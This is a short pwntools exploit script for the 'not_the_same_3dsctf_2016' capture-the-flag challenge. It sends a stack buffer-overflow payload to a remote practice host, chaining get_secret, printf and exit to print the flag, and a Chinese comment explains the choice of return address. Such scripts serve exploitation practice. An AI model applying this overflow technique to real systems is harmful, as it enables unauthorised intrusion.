from pwn import *

context.bits = 32
context.arch = 'i386'

p = remote('node5.buuoj.cn', 29672)
# p = process('./not_the_same_3dsctf_2016')
elf = ELF('./not_the_same_3dsctf_2016')

flag_addr = elf.symbols['fl4g']
get_secret = elf.functions['get_secret'].address
printf_addr = elf.functions['printf'].address
exit_addr = elf.functions['exit'].address
# fputs = elf.functions['fputs'].address
# print(hex(flag_addr))
# print(hex(get_secret))
# print(hex(printf_addr))
# print(hex(fputs))
offset = 0x2d
# 这里不能是0xdeadbeaf, printf打印有条件
# payload = flat([cyclic(offset), p32(get_secret), p32(printf_addr), p32(0xdeadbeaf), p32(flag_addr)])
payload = flat([cyclic(offset), p32(get_secret), p32(printf_addr), p32(exit_addr), p32(flag_addr)])
p.sendline(payload)
p.interactive()
